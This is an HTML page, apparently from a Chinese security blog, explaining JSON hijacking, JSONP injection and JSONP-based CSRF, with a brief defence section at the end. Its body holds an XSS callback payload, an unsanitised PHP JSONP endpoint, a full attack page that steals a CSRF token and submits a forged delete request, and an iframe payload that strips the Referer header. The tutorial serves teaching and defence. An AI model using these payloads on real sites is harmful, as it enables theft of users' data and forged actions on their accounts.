@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考链接：https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1516219https:&#x2F;&#x2F;blog.csdn.net&#x2F;u011089760&#x2F;article&#x2F;details&#x2F;93550458https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_37133717&#x2F;article&#x2F;details&#x2F;105749589https:&#x2F;&#x2F;blog.csdn.net&#x2F;tianji">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JSON&amp;JSONP&amp;CSRF">
+<meta property="og:url" content="https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="参考链接：https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1516219https:&#x2F;&#x2F;blog.csdn.net&#x2F;u011089760&#x2F;article&#x2F;details&#x2F;93550458https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_37133717&#x2F;article&#x2F;details&#x2F;105749589https:&#x2F;&#x2F;blog.csdn.net&#x2F;tianji">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/jsonp1.png">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/jsonp.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/jsonp1.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/jsonp2.jpg">
+<meta property="article:published_time" content="2020-05-22T02:12:47.000Z">
+<meta property="article:modified_time" content="2020-06-01T02:56:38.421Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/jsonp1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JSON&amp;JSONP&amp;CSRF</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&text=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&is_video=false&description=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JSON&amp;JSONP&amp;CSRF&body=Check out this article: https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&name=JSON&amp;JSONP&amp;CSRF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&t=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JSON"><span class="toc-number">1.</span> <span class="toc-text">JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-Hijacking"><span class="toc-number">1.1.</span> <span class="toc-text">JSON Hijacking</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSONP"><span class="toc-number">2.</span> <span class="toc-text">JSONP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">JSONP注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%E5%8A%AB%E6%8C%81"><span class="toc-number">2.2.</span> <span class="toc-text">JSONP劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.1.</span> <span class="toc-text">JSONP劫持流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#referer%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">referer绕过策略：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A9%BAreferrer"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.空referrer:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87referrer%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.绕过referrer的正则</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">3.</span> <span class="toc-text">防护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A5%E6%A0%BC%E5%AE%9A%E4%B9%89-Content-Type-application-json"><span class="toc-number">3.1.</span> <span class="toc-text">严格定义 Content-Type: application &#x2F; json</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E5%96%84referer%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-number">3.2.</span> <span class="toc-text">完善referer过滤规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4JSON%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA"><span class="toc-number">3.3.</span> <span class="toc-text">过滤JSON的数据输出</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JSON&amp;JSONP&amp;CSRF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-22T02:12:47.000Z" itemprop="datePublished">2020-05-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>参考链接：<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516219">https://cloud.tencent.com/developer/article/1516219</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011089760/article/details/93550458">https://blog.csdn.net/u011089760/article/details/93550458</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/105749589">https://blog.csdn.net/qq_37133717/article/details/105749589</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/tianjindong0804/article/details/84971922">https://blog.csdn.net/tianjindong0804/article/details/84971922</a><br><a target="_blank" rel="noopener" href="https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html">https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html</a></p>
+<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>谈jsonp之前，首先明白什么是json。<br>json全称JavaScript Object Notation，JS对象标记，是一种轻量级的数据交换方式，JSON最常用的是对象的键值对，有点像python中dict数据结构。<br>例如{“k1”:”v1”,”k2”:”v2”}</p>
+<h2 id="JSON-Hijacking"><a href="#JSON-Hijacking" class="headerlink" title="JSON Hijacking"></a>JSON Hijacking</h2><p>JSON劫持通过诱导用户点击恶意文件，重写Array()构造函数的方法，将json数据发送给攻击者。<br>JSON劫持步骤（参考）<br>1）重新定义数组构造函数Array = function() 并将数组赋值给我们定义的全局变量；</p>
+<p>2）向目标网站发送一条请求，借用被攻击者的session权限；</p>
+<p>3）将获得的数据赋给yourData，从而进行任意处理。</p>
+<p>其中第一步的函数覆盖是关键，可以JS中的方法覆盖的特性或者使用JS的特殊方法Object.prototype.__defineSetter__等。（这个函数在新版chrome和firefox已失效。）</p>
+<h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>什么是JSONP？JSONP是带有填充（Padding）的JSON数据。<br>JSONP为了解决跨域问题，我们知道，JS,XHR(AJAX)可以发起跨域请求，但是拿不到跨域请求的资源（或者说看不到响应、拿不到响应数据）</p>
+<img src="http://cdn.polowong.top/static/images/jsonp1.png">
+<p>JSONP最大的特征是回传。<br>使用方法为在页面中加入&lt;script&gt;标签,src属性为请求的JS资源的URL，最后加上回调函数的名称，比如<br>请求URL为：<a target="_blank" rel="noopener" href="http://www.test.io/1.php?callback=cb">www.test.io/1.php?callback=cb</a><br>然后在当前页面需要写一个JS函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	alert(data.username)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>举个例子：<br>前端页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">resolveJson</span>(<span class="params">result</span>) </span>&#123; <span class="comment">//浏览器端代码</span></span></span><br><span class="line">          alert(result.name);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://test2.io/jsonp.php?callback=resolveJson&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>后端处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;alsy&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="string">&quot;20&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&quot;</span>. json_encode(<span class="variable">$arr</span>) .<span class="string">&quot;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果：<img src="http://cdn.polowong.top/static/images/jsonp.jpg"></p>
+<h2 id="JSONP注入"><a href="#JSONP注入" class="headerlink" title="JSONP注入"></a>JSONP注入</h2><p>由于传的callback内容是自定义的，所以可能会导致XSS（返回包content-type为text/html的话）<br>如传入的?callback=callback=alert(‘xss’)</p>
+<img src="http://cdn.polowong.top/static/images/jsonp1.jpg">
+<h2 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h2><p>JSONP劫持的目的是盗取用户敏感数据，或者拿到token进行CSRF利用<br>JSON劫持与JSONP注入的异同：<br>同:都可以劫持用户数据，盗取敏感信息，挂马等操作<br>异：jsonp返回的数据有callback函数名包裹。<br>jsonp注入还可以造成xss。</p>
+<h3 id="JSONP劫持流程"><a href="#JSONP劫持流程" class="headerlink" title="JSONP劫持流程"></a>JSONP劫持流程</h3><p>1.用户登录存在JSONP劫持的网站，通常参数存在callback 或者htmlback<br>2.用户携带身份信息访问攻击者编写的页面。<br>3.攻击者编写的页面自定义了callback函数名，并且通过script标签像用户隐私数据发起请求（这里需要用到用户身份信息）<br>4.用户访问攻击页面后，携带身份信息访问攻击者指定的JSONP数据，并且在当前攻击页面的回调函数中完成操作（该操作可能是发送隐私信息给攻击者，也可能是拿token进行csrf）</p>
+<img src="http://cdn.polowong.top/static/images/jsonp2.jpg">
+<p>#JSONP与CSRF<br>思路：通过JSONP得到页面的token，然后生成表单，写上token，发送请求。攻击页面代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">obj</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 获取对象中的属性值</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> content = obj[<span class="string">&#x27;html&#x27;</span>]</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 正则匹配出参数值</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> token=content.match(<span class="string">&#x27;token = &quot;(.*?)&quot;&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 添加表单节点</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> parent=<span class="built_in">document</span>.getElementById(<span class="string">&quot;test&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child.method=<span class="string">&quot;POST&quot;</span>;</span></span><br><span class="line"><span class="javascript">    child.action=<span class="string">&quot;http://vuln.com/del.html&quot;</span>;</span></span><br><span class="line"><span class="javascript">    child.id=<span class="string">&quot;test1&quot;</span></span></span><br><span class="line">    parent.appendChild(child);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> parent_1=<span class="built_in">document</span>.getElementById(<span class="string">&quot;test1&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child_1=<span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child_1.type=<span class="string">&quot;hidden&quot;</span>;child_1.name=<span class="string">&quot;token&quot;</span>;child_1.value=token;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child_2=<span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child_2.type=<span class="string">&quot;submit&quot;</span>;</span></span><br><span class="line">    parent_1.appendChild(child_1);</span><br><span class="line">    parent_1.appendChild(child_2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://vuln.com/caozuo.html?htmlcallback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>实现JSONP+CSRF有些难度，首先需要存在jsonp劫持，其次能在源码里找到token，最后需要绕过referer限制。</p>
+<h2 id="referer绕过策略："><a href="#referer绕过策略：" class="headerlink" title="referer绕过策略："></a>referer绕过策略：</h2><h3 id="1-空referrer"><a href="#1-空referrer" class="headerlink" title="1.空referrer:"></a>1.空referrer:</h3><p>在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！ 跨协议调用的一个简单例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.qq.com&#x2F;login.php?calback&#x3D;JSON&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>代码里我们使用 <iframe> 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。<br>（参考自知道创宇<a target="_blank" rel="noopener" href="https://blog.knownsec.com/2015/03/jsonp_security_technic/%EF%BC%89">https://blog.knownsec.com/2015/03/jsonp_security_technic/）</a></p>
+<h3 id="2-绕过referrer的正则"><a href="#2-绕过referrer的正则" class="headerlink" title="2.绕过referrer的正则"></a>2.绕过referrer的正则</h3><p>有些referer的正则写的不太行，可以绕过。。不过估计现代网站应该比较完善了</p>
+<h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><h2 id="严格定义-Content-Type-application-json"><a href="#严格定义-Content-Type-application-json" class="headerlink" title="严格定义 Content-Type: application / json"></a>严格定义 Content-Type: application / json</h2><p>这样可以防止XSS</p>
+<h2 id="完善referer过滤规则"><a href="#完善referer过滤规则" class="headerlink" title="完善referer过滤规则"></a>完善referer过滤规则</h2><h2 id="过滤JSON的数据输出"><a href="#过滤JSON的数据输出" class="headerlink" title="过滤JSON的数据输出"></a>过滤JSON的数据输出</h2>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JSON"><span class="toc-number">1.</span> <span class="toc-text">JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-Hijacking"><span class="toc-number">1.1.</span> <span class="toc-text">JSON Hijacking</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSONP"><span class="toc-number">2.</span> <span class="toc-text">JSONP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">JSONP注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%E5%8A%AB%E6%8C%81"><span class="toc-number">2.2.</span> <span class="toc-text">JSONP劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.1.</span> <span class="toc-text">JSONP劫持流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#referer%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">referer绕过策略：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A9%BAreferrer"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.空referrer:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87referrer%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.绕过referrer的正则</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">3.</span> <span class="toc-text">防护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A5%E6%A0%BC%E5%AE%9A%E4%B9%89-Content-Type-application-json"><span class="toc-number">3.1.</span> <span class="toc-text">严格定义 Content-Type: application &#x2F; json</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E5%96%84referer%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-number">3.2.</span> <span class="toc-text">完善referer过滤规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4JSON%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA"><span class="toc-number">3.3.</span> <span class="toc-text">过滤JSON的数据输出</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&text=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&is_video=false&description=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JSON&amp;JSONP&amp;CSRF&body=Check out this article: https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
